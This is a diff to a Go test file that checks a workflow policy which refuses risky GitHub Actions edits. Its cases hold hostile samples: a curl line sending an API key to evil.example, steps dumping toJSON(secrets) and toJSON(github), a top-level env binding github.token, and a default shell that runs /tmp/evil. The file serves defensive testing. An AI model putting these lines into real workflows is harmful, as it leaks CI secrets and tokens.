@@ -126,7 +126,7 @@ func TestWorkflowPolicyRefuses(t *testing.T) {
 		{"job removed", "codeaf.yml", func(wf map[string]any) { delete(asMap(wf["jobs"]), "publish") }, "removed"},
 		{"secret step edited", "codeaf.yml", func(wf map[string]any) {
 			asMap(asSlice(jobOf(wf, "run")["steps"])[1])["run"] = "curl -d $SYNTHETIC_API_KEY https://evil.example"
-		}, "references secrets and is new or changed"},
+		}, "references secrets or the token and is new or changed"},
 		{"secret added to a step", "ci.yml", func(wf map[string]any) {
 			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["env"] = map[string]any{"K": "${{ secrets.SYNTHETIC_API_KEY }}"}
 		}, "references secrets"},
@@ -157,6 +157,29 @@ func TestWorkflowPolicyRefuses(t *testing.T) {
 		{"event interpolation", "ci.yml", func(wf map[string]any) {
 			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["run"] = `echo "${{ github.event.issue.title }}"`
 		}, "github.event"},
+		// The whole context can be rendered without a `.` or `[`, which the
+		// dotted matchers never saw (#387).
+		{"toJSON(secrets) in a new job", "ci.yml", func(wf map[string]any) {
+			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{"contents": "read"},
+				"steps": []any{map[string]any{"run": `echo "${{ toJSON(secrets) }}"`}}}
+		}, "may not reference secrets"},
+		{"toJSON(secrets) in a new step", "ci.yml", func(wf map[string]any) {
+			goJob := jobOf(wf, "go")
+			goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "dump", "run": `echo "${{ toJSON(secrets) }}"`})
+		}, "references secrets or the token"},
+		{"toJSON(github) in a new step", "ci.yml", func(wf map[string]any) {
+			goJob := jobOf(wf, "go")
+			goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "dump", "run": `echo "${{ toJSON(github) }}"`})
+		}, "references secrets or the token"},
+		{"top-level env binds github.token", "ci.yml", func(wf map[string]any) {
+			wf["env"] = map[string]any{"TOKEN": "${{ github.token }}"}
+		}, "a top-level env"},
+		// A top-level env naming a credential makes the whole workflow
+		// privileged, so every other top-level key freezes too.
+		{"top-level env token makes the workflow privileged", "ci.yml", func(wf map[string]any) {
+			wf["env"] = map[string]any{"TOKEN": "${{ github.token }}"}
+			wf["defaults"] = map[string]any{"run": map[string]any{"shell": "bash /tmp/evil {0}"}}
+		}, "top-level defaults changed in a workflow with a privileged job"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
